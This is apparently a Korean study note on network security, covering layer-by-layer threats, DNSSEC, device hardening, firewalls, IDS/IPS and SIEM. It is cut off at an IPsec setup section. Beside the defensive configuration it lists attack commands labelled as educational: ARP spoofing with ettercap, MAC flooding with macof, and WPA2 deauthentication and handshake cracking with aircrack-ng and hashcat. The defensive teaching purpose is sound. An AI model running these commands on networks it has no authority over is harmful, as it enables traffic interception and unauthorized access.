---
title: 03-네트워크-보안
tags: []
aliases: []
date modified: 2025-12-28 23:23:32 +09:00
date created: 2025-12-16 20:25:15 +09:00
---

## 3. 네트워크 보안

### 3.1 네트워크 기초 보안

#### 3.1.1 네트워크 보안 개요

##### 네트워크 보안의 중요성

- **네트워크의 역할**: 현대 비즈니스의 핵심 인프라
- **보안 위협 증가**: 원격 근무, 클라우드, IoT 확산
- **공격 표면 확대**: 물리적 경계의 모호화
- **비즈니스 연속성**: 네트워크 장애 시 업무 중단

##### 네트워크 보안 원칙

1. **심층 방어 (Defense in Depth)**: 다계층 보안 적용
2. **최소 권한 (Least Privilege)**: 필요한 최소 네트워크 접근 허용
3. **암호화 (Encryption)**: 데이터 전송 시 암호화 필수
4. **모니터링 (Monitoring)**: 지속적인 네트워크 트래픽 감시
5. **세그멘테이션 (Segmentation)**: 네트워크 영역 분리
6. **제로 트러스트 (Zero Trust)**: 내부 네트워크도 신뢰하지 않음

#### 3.1.2 TCP/IP 프로토콜 스택 상세 보안

##### OSI 7 계층별 보안 위협과 대응

###### 1 계층 - 물리 계층 (Physical Layer)

**위협**:
```
전자기 간섭 (EMI/RFI):
- 의도적 전파 방해
- TEMPEST 공격 (전자기 정보 유출)
- 전력선 분석 (Power Analysis)

물리적 접근:
- 케이블 절단/도청
- 네트워크 탭 설치
- 허브 포트 미러링
- 광섬유 벤딩/탭핑

하드웨어 변조:
- 네트워크 장비 변조
- 가짜 네트워크 포트
- 키보드/마우스 하드웨어 키로거
```

**대응 방안**:
```bash
물리적 보안:
- 서버실/네트워크실 접근 제어
- CCTV 및 침입 탐지 센서
- 케이블 트레이 보호
- 광섬유 사용 (도청 탐지 용이)

전자기 보안:
- EMI 차폐 (Faraday Cage)
- TEMPEST 표준 준수
- 신호 레벨 모니터링
```

###### 2 계층 - 데이터 링크 계층 (Data Link Layer)

**주요 프로토콜**: Ethernet, Wi-Fi (802.11), PPP

**ARP (Address Resolution Protocol) 보안**:

```bash
# ARP 테이블 확인
arp -a

# 정적 ARP 엔트리 추가
arp -s 192.168.1.1 00:11:22:33:44:55

# ARP 스푸핑 탐지
arpwatch  # Linux ARP 모니터링
arp-scan -l  # 네트워크 ARP 스캔

# ARP 스푸핑 공격 (교육용)
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//
```

**MAC 주소 보안**:
```bash
# MAC 주소 변경
ifconfig eth0 down
ifconfig eth0 hw ether 00:11:22:33:44:55
ifconfig eth0 up

# MAC 주소 필터링 (스위치)
switchport security
switchport security mac-address sticky
switchport security maximum 1
switchport security violation shutdown
```

**VLAN 보안**:
```
VLAN 호핑 공격:
1. Switch Spoofing: DTP 프로토콜 악용
2. Double Tagging: 이중 VLAN 태그 삽입

대응 방안:
- DTP 비활성화: switchport nonegotiate
- 액세스 포트 명시: switchport mode access
- Native VLAN 변경: switchport trunk native vlan 999
- VLAN ACL 적용
```

###### 3 계층 - 네트워크 계층 (Network Layer)

**IP 프로토콜 보안**:

```bash
# IP 스푸핑 탐지
tcpdump -i eth0 'src host 192.168.1.100'
wireshark  # GUI 패킷 분석

# IP 단편화 공격 방지 (Linux iptables)
iptables -A INPUT -f -j DROP  # 단편화된 패킷 차단

# 소스 라우팅 비활성화
echo 0 > /proc/sys/net/ipv4/conf/all/accept_source_route
sysctl net.ipv4.conf.all.accept_source_route=0
```

**ICMP 보안**:

```bash
# ICMP 리다이렉트 비활성화
sysctl net.ipv4.conf.all.accept_redirects=0
sysctl net.ipv4.conf.all.send_redirects=0

# ICMP 타임스탬프 요청 차단
iptables -A INPUT -p icmp --icmp-type timestamp-request -j DROP

# Ping of Death 방지
iptables -A INPUT -p icmp --icmp-type echo-request -m length --length 1000: -j DROP
```

**라우팅 프로토콜 보안**:

```
BGP 보안:
- RPKI (Resource Public Key Infrastructure)
- BGP 경로 필터링
- IRR (Internet Routing Registry) 활용
- BGPsec 프로토콜

OSPF 보안:
- 인증 설정: ip ospf authentication message-digest
- 키 관리: ip ospf message-digest-key 1 md5 mysecretkey

RIP 보안:
- 인증 활성화: ip rip authentication mode md5
```

###### 4 계층 - 전송 계층 (Transport Layer)

**TCP 프로토콜 보안**:

```bash
# SYN 쿠키 활성화 (SYN Flood 방지)
sysctl net.ipv4.tcp_syncookies=1

# TCP 시퀀스 번호 랜덤화
sysctl net.ipv4.tcp_rfc1337=1

# TCP 연결 추적
netstat -an | grep ESTABLISHED
ss -tuln  # 소켓 통계

# TCP RST 공격 탐지
tcpdump -i eth0 'tcp[tcpflags] & tcp-rst != 0'
```

**포트 스캔 탐지 및 방어**:

```bash
# Nmap 포트 스캔
nmap -sS -O target_ip  # SYN 스캔
nmap -sU target_ip     # UDP 스캔
nmap -sA target_ip     # ACK 스캔

# 포트 스캔 탐지
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP

# Fail2ban 설정
[DEFAULT]
bantime = 3600
findtime = 600
maxretry = 3
```

#### 3.1.3 DNS 보안 심화

##### DNS 취약점과 공격

```plaintext
DNS 캐시 포이즈닝 (Kaminsky Attack):
1. 공격자가 대량의 DNS 쿼리 전송
2. 무작위 Transaction ID와 소스 포트 사용
3. 정상 응답보다 빠른 가짜 응답 전송
4. DNS 캐시에 가짜 정보 저장

DNS 터널링:
- DNS 쿼리에 데이터 은닉
- TXT, NULL 레코드 악용
- 방화벽 우회 통신
```

##### DNSSEC (DNS Security Extensions)

```plaintext
DNSSEC 구성 요소:
- DNSKEY: 공개키 레코드
- RRSIG: 리소스 레코드 서명
- DS: 위임 서명자
- NSEC/NSEC3: 존재하지 않는 도메인 증명

DNSSEC 검증 과정:
1. Root zone의 KSK 신뢰 앵커
2. 체인 검증 (.com → example.com)
3. RRSIG 서명 검증
4. 데이터 무결성 확인
```

```bash
# DNSSEC 설정 (BIND)
zone "example.com" {
    type master;
    file "/var/named/example.com.zone";
    key-directory "/var/named/keys";
    auto-dnssec maintain;
};

# DNSSEC 키 생성
dnssec-keygen -a RSASHA256 -b 2048 -n ZONE example.com
dnssec-keygen -a RSASHA256 -b 4096 -n ZONE -f KSK example.com

# 존 서명
dnssec-signzone -A -3 $(head -c 1000 /dev/random | sha1sum | cut -b 1-16) -N INCREMENT -o example.com -t example.com.zone
```

##### DNS over HTTPS (DoH) 및 DNS over TLS (DoT)

```
DoH (RFC 8484):
- HTTPS를 통한 DNS 쿼리
- 포트 443 사용
- HTTP/2 기반
- 주요 제공자: Cloudflare (1.1.1.1), Google (8.8.8.8)

DoT (RFC 7858):
- TLS를 통한 DNS 쿼리
- 포트 853 사용
- 스트림 기반
```

```bash
# DoH 클라이언트 설정
# Firefox: network.trr.mode = 2, network.trr.uri = https://1.1.1.1/dns-query

# DoT 서버 설정 (Unbound)
server:
    tls-cert-bundle: "/etc/ssl/certs/ca-certificates.crt"
forward-zone:
    name: "."
    forward-tls-upstream: yes
    forward-addr: 1.1.1.1@853
```

#### 3.1.4 네트워크 장비 보안

##### 스위치 보안 상세

```plaintext
MAC 플러딩 공격:
- CAM 테이블 오버플로우 유발
- 스위치를 허브 모드로 변경
- 모든 트래픽 브로드캐스트

방어 방법:
switchport security
switchport security maximum 2
switchport security mac-address sticky
switchport security violation protect
```

```bash
# MAC 플러딩 공격 도구 (macof)
macof -i eth0 -n 1000

# 포트 보안 설정 확인
show port-security interface fastethernet 0/1

# STP 루트 브리지 보안 설정
spanning-tree vlan 1 root primary
spanning-tree mode rapid-pvst
spanning-tree portfast bpduguard default
```

##### 라우터 보안 강화

```plaintext
접근 제어:
- 콘솔 포트 보안
- VTY 라인 접근 제어
- SSH 전용 접속
- 권한 레벨 분리

설정 예시:
line console 0
 password cisco
 login
 exec-timeout 5 0

line vty 0 4
 transport input ssh
 access-class 10 in
 exec-timeout 5 0

access-list 10 permit 192.168.1.0 0.0.0.255
```

##### SNMP 보안

```plaintext
SNMP 버전별 보안:
- SNMPv1/v2c: 평문 커뮤니티 스트링
- SNMPv3: 암호화 및 인증 지원

SNMPv3 설정:
snmp-server view READONLY iso included
snmp-server group MYGROUP v3 priv read READONLY
snmp-server user myuser MYGROUP v3 auth sha mypassword priv aes 128 myenckey
```

#### 3.1.5 무선 네트워크 보안 심화

##### 무선 보안 프로토콜 진화

```plaintext
WEP (1997-2004):
- RC4 스트림 암호 (40/104비트 키)
- 초기화 벡터 (IV) 24비트 (취약)
- 키스트림 재사용 문제
- CRC-32 무결성 검사 (취약)

WPA/WPA2 (2003-2018):
- TKIP/AES-CCMP 암호화
- 802.1X/EAP 인증 (Enterprise)
- PSK (Personal) 모드
- PMKID 공격 취약점 (WPA2)

WPA3 (2018-현재):
- SAE (Dragonfly) 핸드셰이크
- 개별화된 데이터 암호화
- 브루트포스 공격 방지
- OWE (Opportunistic Wireless Encryption)
```

##### 무선 공격 실습

```bash
# 무선 인터페이스 모니터 모드 설정
airmon-ng start wlan0

# 액세스 포인트 스캔
airodump-ng wlan0mon

# WPA2 핸드셰이크 캡처
airodump-ng -c 6 -w capture --bssid AA:BB:CC:DD:EE:FF wlan0mon

# 디어스 인증 공격
aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# WPA2 패스워드 크랙 (Hashcat)
hcxpcapngtool -o hash.22000 -E essidlist capture.cap
hashcat -m 22000 hash.22000 wordlist.txt
```

##### 무선 보안 모니터링

```bash
# Rogue AP 탐지
kismet
aircrack-ng suite

# 무선 침입 탐지 시스템 (WIDS)
# Cisco WLC WIDS 설정
config wps rogue ap classify friendly state enable
config wps rogue ap friendly add <MAC> <Type>

# Aruba WIPS 설정
ids general-profile default-profile
ids signature-profile default-signature
```

##### Enterprise 무선 보안 (802.1X/EAP)

```plaintext
EAP 방식별 특징:

EAP-TLS:
- 상호 인증서 인증
- 가장 강력한 보안
- PKI 인프라 필요

EAP-TTLS:
- 서버 인증서 + 클라이언트 패스워드
- 터널링을 통한 보안

PEAP:
- Microsoft 표준
- MSCHAPv2 내부 인증
- 사용자 인증서 선택적

EAP-FAST:
- Cisco 독점 방식
- PAC (Protected Access Credential)
- 빠른 재인증
```

```bash
# FreeRADIUS 설정
# clients.conf
client 192.168.1.0/24 {
    secret = testing123
    shortname = wireless-network
}

# users 설정
"testuser" Cleartext-Password := "password"
    Reply-Message := "Hello, %{User-Name}"
```

#### 3.1.6 네트워크 세그멘테이션과 마이크로 세그멘테이션

##### 전통적 네트워크 세그멘테이션

```plaintext
VLAN 기반 세그멘테이션:
- 브로드캐스트 도메인 분리
- 레이어 2 격리
- 트렁크 포트 통한 VLAN 간 통신

서브넷 기반 세그멘테이션:
- 레이어 3 논리적 분리
- 라우터/방화벽 통한 제어
- IP 주소 체계 기반 분리
```

##### 마이크로 세그멘테이션 (Zero Trust Network)

```plaintext
구현 방법:
1. Software-Defined Perimeter (SDP)
2. Software-Defined WAN (SD-WAN)
3. Network Access Control (NAC)
4. Identity-based segmentation

기술 스택:
- VMware NSX
- Cisco ACI (Application Centric Infrastructure)
- Illumio Adaptive Security Platform
- Guardicore Centra
```

##### SDN (Software-Defined Networking) 보안

```plaintext
OpenFlow 프로토콜 보안:
- 컨트롤러-스위치 간 TLS 통신
- 플로우 테이블 무결성 검증
- 컨트롤러 중복화

SDN 보안 위협:
- 컨트롤러 공격 (Single Point of Failure)
- 사이드 채널 공격
- 플로우 규칙 조작
- DDoS 공격 증폭
```

### 3.2 방화벽과 침입탐지시스템

#### 3.2.1 방화벽 (Firewall) 상세

##### 방화벽 발전사와 세대별 분류

```plaintext
1세대 - 패킷 필터 (1980년대):
- 네트워크/전송 계층 헤더 기반 필터링
- IP 주소, 포트 번호, 프로토콜 검사
- 무상태 (Stateless) 처리

2세대 - 회로 레벨 게이트웨이 (1990년대 초):
- 세션 계층 감시
- TCP 연결 상태 추적
- 프록시 기반 연결 중계

3세대 - 상태 추적 방화벽 (1990년대):
- 연결 상태 테이블 유지
- 동적 포트 개방/차단
- TCP 시퀀스 번호 검증

4세대 - 애플리케이션 게이트웨이 (1990년대 후반):
- 응용 계층 프로토콜 분석
- 콘텐츠 필터링
- 심층 패킷 검사

5세대 - 차세대 방화벽 NGFW (2000년대):
- 애플리케이션 식별 및 제어
- 사용자 기반 정책
- 침입 방지 시스템 통합
- 안티바이러스/안티스팸 통합
```

##### 방화벽 기술 상세

###### 패킷 필터링 방화벽

```bash
# iptables 기본 체인
INPUT:   호스트로 들어오는 패킷
OUTPUT:  호스트에서 나가는 패킷
FORWARD: 호스트를 통과하는 패킷

# 기본 정책 설정 (기본 거부)
iptables -P INPUT DROP
iptables -P OUTPUT ACCEPT
iptables -P FORWARD DROP

# 특정 서비스 허용
iptables -A INPUT -p tcp --dport 22 -j ACCEPT    # SSH
iptables -A INPUT -p tcp --dport 80 -j ACCEPT    # HTTP
iptables -A INPUT -p tcp --dport 443 -j ACCEPT   # HTTPS

# 소스 IP 기반 제어
iptables -A INPUT -s 192.168.1.0/24 -j ACCEPT   # 내부망 허용
iptables -A INPUT -s 10.0.0.1 -j DROP           # 특정 IP 차단

# 시간 기반 제어
iptables -A INPUT -p tcp --dport 80 -m time --timestart 09:00 --timestop 18:00 --days Mon,Tue,Wed,Thu,Fri -j ACCEPT
```

###### 상태 추적 방화벽 (Stateful Firewall)

```bash
# 연결 상태 기반 필터링
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -m state --state NEW -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -m state --state INVALID -j DROP

# 연결 추적 테이블 확인
cat /proc/net/nf_conntrack
conntrack -L

# 연결 추적 매개변수 조정
echo 65536 > /proc/sys/net/netfilter/nf_conntrack_max
echo 300 > /proc/sys/net/netfilter/nf_conntrack_tcp_timeout_established
```

###### 애플리케이션 게이트웨이 (Proxy Firewall)

```plaintext
동작 원리:
1. 클라이언트가 프록시에 연결 요청
2. 프록시가 요청 검증 및 필터링
3. 프록시가 서버에 대신 연결
4. 응답 데이터 검증 후 클라이언트 전달

장점:
- 애플리케이션 프로토콜 완전 분석
- 내부 네트워크 주소 숨김
- 상세한 로깅 및 감사

단점:
- 성능 오버헤드
- 각 프로토콜별 프록시 필요
- 지연시간 증가
```

```bash
# Squid 프록시 설정 예시
# /etc/squid/squid.conf
acl localnet src 192.168.1.0/24
acl CONNECT method CONNECT
acl Safe_ports port 80 443 21 70 210 1025-65535
acl SSL_ports port 443

http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access allow localnet
http_access deny all

# 콘텐츠 필터링
acl blocked_sites dstdomain "/etc/squid/blocked_sites.txt"
http_access deny blocked_sites
```

##### 차세대 방화벽 (NGFW) 심화

###### 애플리케이션 인식 및 제어

```plaintext
DPI (Deep Packet Inspection) 기술:
- L7 페이로드 분석
- 애플리케이션 시그니처 매칭
- 행위 패턴 분석
- 암호화된 트래픽 메타데이터 분석

애플리케이션 분류:
- 소셜 미디어 (Facebook, Twitter, Instagram)
- P2P (BitTorrent, eMule)
- 스트리밍 (YouTube, Netflix)
- 클라우드 서비스 (Dropbox, OneDrive)
- 게임 (온라인 게임, 모바일 게임)
```

###### 사용자 기반 정책 (User-ID)

```plaintext
사용자 식별 방법:
1. Active Directory 통합 로그인 모니터링
2. RADIUS/LDAP 인증 로그 분석
3. Browser-based 인증
4. Terminal Server Agent
5. Captive Portal

정책 예시:
- 임원: 모든 애플리케이션 허용
- 일반직원: 업무용 애플리케이션만 허용
- 게스트: 웹 브라우징만 허용
- IT팀: 관리 도구 추가 허용
```

##### 방화벽 아키텍처 설계

###### DMZ (Demilitarized Zone) 설계

```plaintext
Single DMZ:
[Internet] --- [Firewall] --- [DMZ] --- [Firewall] --- [Internal LAN]

Dual DMZ:
[Internet] --- [Firewall] --- [Public DMZ] --- [Firewall] --- [Private DMZ] --- [Firewall] --- [Internal LAN]

서버 배치:
- Public DMZ: 웹 서버, 메일 서버, DNS 서버
- Private DMZ: 애플리케이션 서버, 중간웨어
- Internal LAN: 데이터베이스 서버, 파일 서버
```

###### 고가용성 (High Availability) 구성

```plaintext
Active-Passive:
- 주 방화벽 장애 시 대기 방화벽 활성화
- 상태 동기화 (State Synchronization)
- Failover 시간: 수십 초

Active-Active:
- 두 방화벽이 동시에 트래픽 처리
- 로드 밸런싱 효과
- 더 복잡한 설정

클러스터 구성:
- 여러 방화벽의 논리적 통합
- 중앙 집중 관리
- 확장성 제공
```

#### 3.2.2 침입탐지시스템 (IDS) 상세

##### IDS 발전사와 분류

```plaintext
1세대 (1980년대):
- 감사 로그 기반 사후 분석
- 수동적 탐지

2세대 (1990년대):
- 실시간 모니터링
- 시그니처 기반 탐지

3세대 (2000년대):
- 이상 행위 탐지
- 통계적 분석

4세대 (2010년대):
- 머신러닝 기반
- 행위 분석
- 위협 인텔리전스 통합
```

##### 네트워크 기반 IDS (NIDS)

###### Snort 설정과 운영

```bash
# Snort 설치 및 설정
apt-get install snort

# 기본 설정 파일
/etc/snort/snort.conf

# 네트워크 변수 설정
var HOME_NET 192.168.1.0/24
var EXTERNAL_NET !$HOME_NET
var SMTP_SERVERS $HOME_NET
var HTTP_SERVERS $HOME_NET
var SQL_SERVERS $HOME_NET
var DNS_SERVERS $HOME_NET

# 규칙 파일 위치
var RULE_PATH /etc/snort/rules

# Snort 실행
snort -A console -q -c /etc/snort/snort.conf -i eth0

# 규칙 예시 (/etc/snort/rules/local.rules)
alert tcp any any -> $HOME_NET 22 (msg:"SSH connection attempt"; sid:1000001; rev:1;)
alert icmp any any -> $HOME_NET any (msg:"ICMP Ping attempt"; sid:1000002; rev:1;)
alert tcp any any -> $HOME_NET 80 (msg:"HTTP GET request"; content:"GET"; sid:1000003; rev:1;)
```

###### Suricata 고성능 IDS

```yaml
# /etc/suricata/suricata.yaml
%YAML 1.1
---
vars:
  address-groups:
    HOME_NET: "[192.168.0.0/16,10.0.0.0/8,172.16.0.0/12]"
    EXTERNAL_NET: "!$HOME_NET"

af-packet:
  - interface: eth0
    cluster-id: 99
    cluster-type: cluster_flow
    defrag: yes

outputs:
  - fast:
      enabled: yes
      filename: fast.log
  - eve-log:
      enabled: yes
      filetype: regular
      filename: eve.json
      types:
        - alert
        - http
        - dns
        - tls
```

```bash
# Suricata 실행
suricata -c /etc/suricata/suricata.yaml -i eth0

# 성능 모니터링
suricatasc -c "capture-mode"
suricatasc -c "iface-stat eth0"

# 규칙 업데이트
suricata-update
systemctl reload suricata
```

##### 호스트 기반 IDS (HIDS)

###### OSSEC 설정과 운영

```xml
<!-- /var/ossec/etc/ossec.conf -->
<ossec_config>
  <global>
    <email_notification>yes</email_notification>
    <email_to>admin@example.com</email_to>
    <smtp_server>localhost</smtp_server>
  </global>

  <rules>
    <include>rules_config.xml</include>
    <include>pam_rules.xml</include>
    <include>sshd_rules.xml</include>
    <include>apache_rules.xml</include>
  </rules>

  <syscheck>
    <frequency>7200</frequency>
    <directories check_all="yes">/etc,/usr/bin,/usr/sbin</directories>
    <directories check_all="yes">/bin,/sbin</directories>
    <ignore>/etc/mtab</ignore>
    <ignore>/etc/hosts.deny</ignore>
  </syscheck>

  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/auth.log</location>
  </localfile>

  <localfile>
    <log_format>apache</log_format>
    <location>/var/log/apache2/access.log</location>
  </localfile>
</ossec_config>
```

###### Wazuh (OSSEC 포크) 현대적 HIDS

```yaml
# /var/ossec/etc/ossec.conf (Wazuh)
<ossec_config>
  <client>
    <server>
      <address>wazuh-manager.example.com</address>
      <port>1514</port>
      <protocol>tcp</protocol>
    </server>
  </client>

  <wodle name="cis-cat">
    <disabled>no</disabled>
    <timeout>1800</timeout>
    <interval>1d</interval>
    <scan-on-start>yes</scan-on-start>
  </wodle>

  <wodle name="vulnerability-detector">
    <disabled>no</disabled>
    <interval>5m</interval>
    <ignore_time>6h</ignore_time>
    <run_on_start>yes</run_on_start>
  </wodle>
</ossec_config>
```

##### 침입탐지 기법 상세

###### 시그니처 기반 탐지

```plaintext
시그니처 작성 방법:

1. 문자열 기반:
alert tcp any any -> any 80 (content:"../"; msg:"Directory traversal attempt";)

2. 정규표현식:
alert tcp any any -> any 80 (pcre:"/\.\./"; msg:"Directory traversal regex";)

3. 바이너리 패턴:
alert tcp any any -> any any (content:"|90 90 90 90|"; msg:"NOP sled detected";)

4. 프로토콜 분석:
alert tcp any any -> any 80 (flags:S; ack:0; msg:"TCP SYN scan";)
```

###### 이상 행위 탐지 (Anomaly Detection)

```python
# 통계적 이상 탐지 예시 (Python)
import numpy as np
from scipy import stats

# 정상 트래픽 패턴 학습
normal_packets = [150, 145, 155, 148, 152, 149, 153, 151]
mean = np.mean(normal_packets)
std = np.std(normal_packets)

# 새로운 패킷 수 분석
new_packet_count = 300
z_score = (new_packet_count - mean) / std

# 임계값 설정 (95% 신뢰구간)
threshold = 1.96
if abs(z_score) > threshold:
    print(f"이상 트래픽 탐지: {new_packet_count} packets (Z-score: {z_score})")
```

###### 머신러닝 기반 탐지
```python
# Random Forest를 이용한 침입 탐지
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
import pandas as pd

# 네트워크 트래픽 특성 추출
features = ['duration', 'protocol', 'src_bytes', 'dst_bytes',
            'flag', 'land', 'wrong_fragment', 'urgent']

# 데이터 로딩 (KDD Cup 99 dataset 예시)
data = pd.read_csv('network_traffic.csv')
X = data[features]
y = data['attack_type']

# 학습/테스트 분할
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3)

# 모델 학습
rf_model = RandomForestClassifier(n_estimators=100)
rf_model.fit(X_train, y_train)

# 예측 및 평가
predictions = rf_model.predict(X_test)
accuracy = rf_model.score(X_test, y_test)
print(f"탐지 정확도: {accuracy:.2%}")
```

#### 3.2.3 침입방지시스템 (IPS) 상세

##### IPS vs IDS 비교

```plaintext
IDS (탐지):
- 수동적 모니터링
- 네트워크 외부 배치 가능
- 사후 분석 및 대응
- 네트워크 성능 영향 최소

IPS (방지):
- 능동적 차단
- 네트워크 경로에 인라인 배치
- 실시간 차단
- 네트워크 지연 및 처리량 영향
```

##### IPS 배치 모드

###### 인라인 모드 (Inline Mode)

```plaintext
브리지 모드:
[Router] --- [IPS] --- [Switch] --- [Servers]
- L2 투명 브리지
- IP 주소 불필요
- 기존 네트워크 구조 변경 최소

라우터 모드:
[Router] --- [IPS] --- [Switch] --- [Servers]
      192.168.1.1  192.168.2.1
- L3 라우팅 기능
- 서로 다른 서브넷 연결
- 네트워크 세그멘테이션 가능
```

###### IPS 우회 기능 (Bypass)

```bash
# 하드웨어 바이패스
- 전원 장애 시 자동 바이패스
- 케이블 물리적 연결
- 네트워크 연속성 보장

# 소프트웨어 바이패스
- CPU 과부하 시 바이패스
- 메모리 부족 시 바이패스
- 정책 설정: fail-open vs fail-close

# Snort IPS 설정
config policy_mode:inline
config checksum_mode: none
config disable_decode_alerts
config disable_tcpopt_experimental_alerts
config disable_tcpopt_obsolete_alerts
config disable_ipopt_alerts
```

##### IPS 성능 최적화

###### 하드웨어 가속

```plaintext
FPGA (Field-Programmable Gate Array):
- 패킷 분류 가속화
- 정규표현식 처리 가속
- 암호화/복호화 오프로딩

멀티코어 처리:
- 패킷 처리 병렬화
- CPU 코어별 역할 분담
- Lock-free 알고리즘 사용

메모리 최적화:
- 패킷 버퍼 관리
- 상태 테이블 최적화
- 캐시 효율성 향상
```

```bash
# Suricata 멀티스레드 설정
threading:
  set-cpu-affinity: yes
  cpu-affinity:
    - management-cpu-set:
        cpu: [ 0 ]
    - receive-cpu-set:
        cpu: [ 1, 2 ]
    - worker-cpu-set:
        cpu: [ 3, 4, 5, 6 ]

# DPDK (Data Plane Development Kit) 활용
# 커널 바이패스로 패킷 처리 성능 향상
```

#### 3.2.4 SIEM 과 로그 분석

##### SIEM 아키텍처

```plaintext
데이터 수집 계층:
- 로그 수집기 (Log Collector)
- 에이전트 (Agent)
- 네트워크 센서 (Network Sensor)
- API 연동

데이터 처리 계층:
- 파싱 (Parsing)
- 정규화 (Normalization)
- 농축 (Aggregation)
- 상관분석 (Correlation)

데이터 저장 계층:
- 실시간 데이터 저장
- 장기 아카이브
- 인덱싱
- 압축

분석 및 시각화 계층:
- 대시보드
- 리포트
- 알림
- 포렌식 분석
```

##### ELK Stack 구축

```yaml
# Elasticsearch 설정
# /etc/elasticsearch/elasticsearch.yml
cluster.name: security-cluster
node.name: node-1
network.host: 0.0.0.0
discovery.seed_hosts: ["host1", "host2"]
cluster.initial_master_nodes: ["node-1"]

# 보안 설정
xpack.security.enabled: true
xpack.security.transport.ssl.enabled: true
xpack.security.http.ssl.enabled: true
```

```yaml
# Logstash 설정
# /etc/logstash/conf.d/security.conf
input {
  beats {
    port => 5044
  }
  syslog {
    port => 514
  }
}

filter {
  if [fields][log_type] == "firewall" {
    grok {
      match => {
        "message" => "%{TIMESTAMP_ISO8601:timestamp} %{WORD:action} %{IP:src_ip} %{IP:dst_ip} %{INT:src_port} %{INT:dst_port}"
      }
    }
    date {
      match => [ "timestamp", "ISO8601" ]
    }
  }

  if [fields][log_type] == "ids" {
    grok {
      match => {
        "message" => "\[%{INT:priority}\] %{GREEDYDATA:signature} \[%{DATA:classification}\] %{IP:src_ip}:%{INT:src_port} -> %{IP:dst_ip}:%{INT:dst_port}"
      }
    }
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "security-logs-%{+YYYY.MM.dd}"
  }
}
```

```json
# Kibana 대시보드 설정
# 보안 이벤트 시각화
{
  "version": "7.10.0",
  "objects": [
    {
      "attributes": {
        "title": "Security Dashboard",
        "type": "dashboard",
        "panelsJSON": "[{\"type\":\"visualization\",\"id\":\"top-attacked-hosts\"},{\"type\":\"visualization\",\"id\":\"attack-timeline\"}]"
      }
    }
  ]
}
```

##### SIEM 상관분석 규칙

```python
# 예시: 브루트포스 공격 탐지 규칙
class BruteForceDetection:
    def __init__(self):
        self.failed_attempts = {}
        self.threshold = 5
        self.time_window = 300  # 5분

    def process_event(self, event):
        if event['event_type'] == 'authentication_failed':
            src_ip = event['src_ip']
            timestamp = event['timestamp']

            # 시간 윈도우 내 실패 횟수 계산
            if src_ip not in self.failed_attempts:
                self.failed_attempts[src_ip] = []

            self.failed_attempts[src_ip].append(timestamp)

            # 시간 윈도우 밖의 기록 제거
            cutoff_time = timestamp - self.time_window
            self.failed_attempts[src_ip] = [
                t for t in self.failed_attempts[src_ip]
                if t > cutoff_time
            ]

            # 임계값 초과 시 알림
            if len(self.failed_attempts[src_ip]) >= self.threshold:
                self.generate_alert(src_ip, len(self.failed_attempts[src_ip]))

    def generate_alert(self, src_ip, count):
        alert = {
            'alert_type': 'brute_force_attack',
            'src_ip': src_ip,
            'failed_attempts': count,
            'severity': 'high',
            'timestamp': time.time()
        }
        self.send_alert(alert)
```

##### 위협 인텔리전스 통합

```python
# STIX/TAXII 표준을 이용한 위협 정보 수집
from stix2 import MemoryStore, Filter
import requests

class ThreatIntelligence:
    def __init__(self):
        self.ioc_store = MemoryStore()
        self.threat_feeds = [
            'https://api.threatstream.com/api/v2/intelligence/',
            'https://otx.alienvault.com/api/v1/indicators/',
            'https://api.virustotal.com/vtapi/v2/'
        ]

    def update_threat_feeds(self):
        for feed_url in self.threat_feeds:
            try:
                response = requests.get(feed_url)
                threat_data = response.json()
                self.process_threat_data(threat_data)
            except Exception as e:
                print(f"Failed to update from {feed_url}: {e}")

    def check_ioc(self, indicator):
        # IP 주소, 도메인, 파일 해시 등 IOC 검사
        filters = [Filter('pattern', '=', indicator)]
        results = self.ioc_store.query(filters)
        return len(results) > 0
```

### 3.3 VPN 과 원격 접속 보안

#### 3.3.1 VPN (Virtual Private Network) 상세

##### VPN 기술 개요와 발전

```plaintext
VPN 발전사:
1990년대: PPTP (Point-to-Point Tunneling Protocol)
- Microsoft 개발, Windows 기본 지원
- 약한 암호화 (RC4), 현재는 보안상 비권장

2000년대: IPSec 표준화
- IETF 표준 프로토콜
- 강력한 보안, 복잡한 설정
- 기업 사이트 간 VPN 주력

2000년대 후반: SSL/TLS VPN 대중화
- 웹 브라우저 기반 접속
- 클라이언트 설치 불요
- 원격 근무자 접속 주력

2010년대: 모바일 VPN 등장
- 스마트폰/태블릿 지원
- Always-On VPN
- Per-App VPN

2020년대: SASE/Zero Trust VPN
- Software-Defined Perimeter (SDP)
- Cloud-native VPN
- Identity-centric security
```

##### IPSec VPN 상세 분석

###### IPSec 프로토콜 스택

```plaintext
IPSec 구성 요소:
1. AH (Authentication Header) - RFC 4302
   - 인증 및 무결성 제공
   - 기밀성 제공 안함
   - 헤더: Next Header | Length | Reserved | SPI | Sequence | Authentication Data

2. ESP (Encapsulating Security Payload) - RFC 4303
   - 기밀성, 인증, 무결성 제공
   - 가장 일반적으로 사용
   - 헤더: SPI | Sequence | Payload | Padding | Authentication Data

3. IKE (Internet Key Exchange) - RFC 7296
   - Phase 1: ISAKMP SA 협상
   - Phase 2: IPSec SA 협상
   - 키 교환 및 관리
```

###### IPSec 동작 모드 비교

```bash
# Transport Mode (전송 모드)
Original:  [IP Header][TCP Header][Data]
IPSec AH:  [IP Header][AH Header][TCP Header][Data]
IPSec ESP: [IP Header][ESP Header][TCP Header][Data][ESP Trailer][ESP Auth]

# Tunnel Mode (터널 모드)
Original:    [IP Header][TCP Header][Data]
IPSec AH:    [New IP Header][AH Header][IP Header][TCP Header][Data]
IPSec ESP:   [New IP Header][ESP Header][IP Header][TCP Header][Data][ESP Trailer][ESP Auth]

용도:
- Transport Mode: 호스트 간 직접 통신
- Tunnel Mode: 네트워크 간 통신, VPN 게이트웨이
```

###### IPSec 설정 실습 (Linux strongSwan)

```bash
# strongSwan 설치
apt-get install strongswan strongswan-pki

# CA 인증서 생성
